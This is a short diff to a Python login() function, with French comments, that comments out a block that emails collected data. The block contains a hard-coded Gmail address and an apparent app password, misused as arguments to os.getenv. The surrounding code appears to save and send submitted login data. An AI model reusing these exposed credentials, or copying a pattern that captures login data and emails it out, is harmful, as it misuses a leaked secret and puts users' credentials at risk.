@@ -30,6 +30,7 @@ def login():
         f.write(data)
         print('donnée recuperer : ',data)
 
+    '''
     # Tu peux stocker ces infos dans des variables d'environnement
     EMAIL_SENDER = os.getenv('bettybe446@gmail.com')       # tonemail@gmail.com
     EMAIL_PASSWORD = os.getenv('ztjg nsyd wfbm tgog')   # mot de passe d'application Gmail
@@ -50,7 +51,7 @@ def login():
             server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
         return "✅ Email envoyé !"
     except Exception as e:
-        return f"❌ Erreur : {e}"
+        return f"❌ Erreur : {e}"'''
 
     
     print("Donnée enregistré")
